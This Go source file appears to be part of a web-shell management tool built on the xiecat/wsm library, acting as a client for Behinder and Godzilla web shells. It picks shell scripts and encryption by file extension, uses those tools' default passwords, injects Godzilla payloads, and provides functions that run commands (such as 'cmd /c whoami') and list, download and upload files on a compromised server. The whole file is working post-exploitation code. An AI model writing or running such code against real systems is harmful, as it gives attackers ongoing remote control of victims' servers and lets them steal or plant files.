package services

import (
	"context"
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/xiecat/wsm"
	"github.com/xiecat/wsm/lib/charset"
	"github.com/xiecat/wsm/lib/shell"
	"github.com/xiecat/wsm/lib/shell/behinder"
	"github.com/xiecat/wsm/lib/shell/godzilla"
	"strings"
)

type Wsm struct {
	WebShell         *wsm.BehinderInfo
	WebShellGodzilla *wsm.GodzillaInfo
}

func (w *Wsm) Init(url string) error {
	script := shell.PhpScript
	if strings.HasSuffix(url, ".jsp") {
		script = shell.JavaScript
	} else if strings.HasSuffix(url, ".jspx") {
		script = shell.JspxScript
	} else if strings.HasSuffix(url, ".asp") {
		script = shell.AspScript
	} else if strings.HasSuffix(url, ".aspx") {
		script = shell.CsharpScript
	} else if strings.HasSuffix(url, ".php") {
		script = shell.PhpScript
	}
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      url,
			Password: "rebeyond",
			Script:   script,
			Headers:  nil,
		},
	}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		return err
	}
	w.WebShell = bx
	return nil
}

// Ping 检测存活
func (w *Wsm) Ping(ctx context.Context) (bool, error) {
	i, err := w.WebShell.Ping()
	if err != nil {
		log.Println(err)
	}
	return i, err
}

// webshell命令执行
func (w *Wsm) CommandExec(ctx context.Context, cmd string) (string, error) {
	param := &behinder.ExecParams{
		OnlyJavaParams: behinder.OnlyJavaParams{},
		Cmd:            cmd,
		Path:           "./",
	}
	exec, err := w.WebShell.CommandExec(param)
	if err != nil {
		return "", err
	}
	fmt.Println(exec.ToMap()["msg"])
	return strings.Trim(exec.ToMap()["msg"], "\n"), err
}

func (w *Wsm) FileList(filePath string) (string, error) {
	f := &behinder.ListFiles{
		Path: filePath,
	}
	file, err := w.WebShell.FileManagement(f)
	if err != nil {
		return "", err
	}
	return file.ToMap()["msg"], nil
}

func (w *Wsm) FileDownload(filePath string) (string, error) {
	f := &behinder.DownloadFile{
		Path: filePath,
	}
	file, err := w.WebShell.FileManagement(f)
	if err != nil {
		return "", err
	}
	fmt.Println(file.ToMap())
	return file.ToMap()["msg"], nil
}

func (w *Wsm) FileUpload(filePath string) (string, error) {
	f := &behinder.UploadFile{
		Path: filePath,
	}
	file, err := w.WebShell.FileManagement(f)
	if err != nil {
		return "", err
	}
	fmt.Println(file.ToMap())
	return file.ToMap()["msg"], nil
}

func (w *Wsm) InitGodzilla(url string) error {
	script := shell.PhpScript
	crypto := godzilla.PHP_XOR_BASE64
	if strings.HasSuffix(url, ".jsp") {
		script = shell.JavaScript
		crypto = godzilla.JAVA_AES_BASE64
	} else if strings.HasSuffix(url, ".jspx") {
		script = shell.JspxScript
		crypto = godzilla.JAVA_AES_BASE64
	} else if strings.HasSuffix(url, ".asp") {
		script = shell.AspScript
		crypto = godzilla.CSHARP_AES_BASE64
	} else if strings.HasSuffix(url, ".aspx") {
		script = shell.CsharpScript
		crypto = godzilla.CSHARP_AES_BASE64
	} else if strings.HasSuffix(url, ".php") {
		script = shell.PhpScript
		crypto = godzilla.PHP_XOR_BASE64
	}
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      url,
			Password: "pass",
			Script:   script,
		},
		Key:      "key",
		Crypto:   crypto,
		Encoding: charset.GBKCharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		fmt.Println(err)
	}
	// 注入全部的 payload
	err = g.InjectPayload()
	if err != nil {
		fmt.Println(err)
	}
	w.WebShellGodzilla = g
	return nil
}

// Ping 检测存活
func (w *Wsm) PingGodzilla(ctx context.Context) (bool, error) {
	i, err := w.WebShellGodzilla.Ping()
	if err != nil {
		log.Println(err)
	}
	return i, err
}
func (w *Wsm) CommandExecGodzilla(ctx context.Context, cmd string) (string, error) {
	cp := &godzilla.ExecParams{
		RealCommand: cmd,
		Template:    `cmd /c "{command}"`,
		Command:     `whoami`,
	}
	echo, err := w.WebShellGodzilla.CommandExec(cp)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(echo.ToMap()["raw"])
	return strings.Trim(echo.ToMap()["raw"], "\n"), err
}

func (w *Wsm) GodzillaFileList(filePath string) (string, error) {
	gf := &godzilla.GetFiles{DirName: filePath}
	getFile, err := w.WebShellGodzilla.FileManagement(gf)
	if err != nil {
		return "", err
	}
	return getFile.ToMap()["raw"], nil
}
